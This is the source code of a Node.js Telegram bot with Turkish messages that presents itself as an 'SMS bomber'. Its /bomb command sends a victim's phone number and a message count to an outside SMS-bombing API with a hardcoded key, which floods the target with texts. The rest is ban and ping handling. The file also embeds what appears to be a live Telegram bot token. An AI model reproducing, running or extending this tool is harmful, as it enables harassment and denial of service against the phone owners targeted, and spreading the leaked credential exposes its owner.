
const { Telegraf } = require('telegraf');
const { performance } = require('perf_hooks');
const fs = require('fs');
const axios = require('axios');

const bot = new Telegraf('6594577310:AAFoeNjgjYnkpE864pb9xtsvDX3HicYvhNk');

bot.command('ban', (ctx) => {
  if (ctx.from.id !== 6626904056) {
    return;
  }

  const bannedUserId = ctx.message.reply_to_message.from.id;

  fs.appendFile('banneds.txt', `\n${bannedUserId}`, (error) => {
    if (error) {
      console.error('Yasaklama işlemi başarısız oldu:', error);
      ctx.reply('Kullanıcı yasaklandı!', error);
    } else {
      console.log('Kullanıcı yasaklandı:', bannedUserId);
      ctx.reply('Kullanıcı yasaklandı!');
    }
  });
});

bot.command("start", (ctx) => {
  const bannedIds = fs.readFileSync('banneds.txt', 'utf-8').split('\n');
  const userId = ctx.message.from.id;

  if (bannedIds.includes(userId.toString())) {
    console.log('Kullanıcı yasaklandı:', userId);
    return ctx.reply('Üzgünüz, yasaklandınız!');
  }

  ctx.replyWithMarkdown(`*Merhaba, SMS bomber botuna hoş geldin!*`
    + `\n_Kullanmak için /bomb <numara> <miktar> yazmanız yeterlidir._`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Ping değerini görüntüle', callback_data: 'ping' }],
        [{text:'Bilgi', callback_data:'bilgi'}]
      ]
    }
  });
});
bot.action('bilgi', (ctx) => {
  ctx.replyWithMarkdown("*Bu bot @erd3mbey tarafından baştan kodlanmıştır*")
})
bot.action('ping', (ctx) => {
  try {
    const start = performance.now();
    const chatId = ctx.chat.id;
    const messageId = ctx.update.callback_query.message.message_id;
    ctx.replyWithMarkdown("*Ping ölçülüyor...*").then((sentMessage) => {
      const end = performance.now();
      const pingTime = Math.round(end - start);
      const alertText = `Ping değeri: ${pingTime}`;

      ctx.telegram.deleteMessage(chatId, sentMessage.message_id);
      ctx.replyWithMarkdown(`*Ping değeri: ${pingTime}*`, { reply_to_message_id: messageId });
      ctx.answerCbQuery(alertText, true);
    });
  } catch (error) {
    ctx.reply('Ping hatası:', error);
  }
});


bot.command("bomb", async (ctx) => {
  try {
    const bannedIds = fs.readFileSync('banneds.txt', 'utf-8').split('\n');
    const userId = ctx.message.from.id;
    const message = ctx.message.text;
    const regex = /(\w+)/g;
    const matches = message.match(regex);

    if (bannedIds.includes(userId.toString())) {
      console.log('Kullanıcı yasaklandı:', userId);
      return ctx.reply('Üzgünüz, yasaklandınız!');
    }

    if (matches.length < 3) {
      // Eksik parametreler olduğunda hata mesajı gönder
      return ctx.reply('Eksik parametreler! Doğru format: /bomb <numara> <miktar>');
    }

    const numara = matches[1];
    const miktar = matches[2];

    const response = await axios.get(`http://oslocheck.com.tr/api/smsbomber?key=ggsahip&numara=${numara}&miktar=${miktar}`);
    const responseData = response.data;

    if (responseData) {
      console.log('Alınan yanıt:', responseData);
      const responseString = JSON.stringify(responseData);
      ctx.replyWithHTML(`<b>Sonuç:</b> <code>${responseString}</code>`);
    } else {
      console.log('Geçersiz yanıt:', response);
      ctx.reply('Bir hata oluştu, lütfen tekrar deneyin.');
    }
  } catch (error) {
    console.error('Bomb hatası:', error);
    ctx.reply('Bir hata oluştu, lütfen tekrar deneyin.');
  }
});

bot.launch();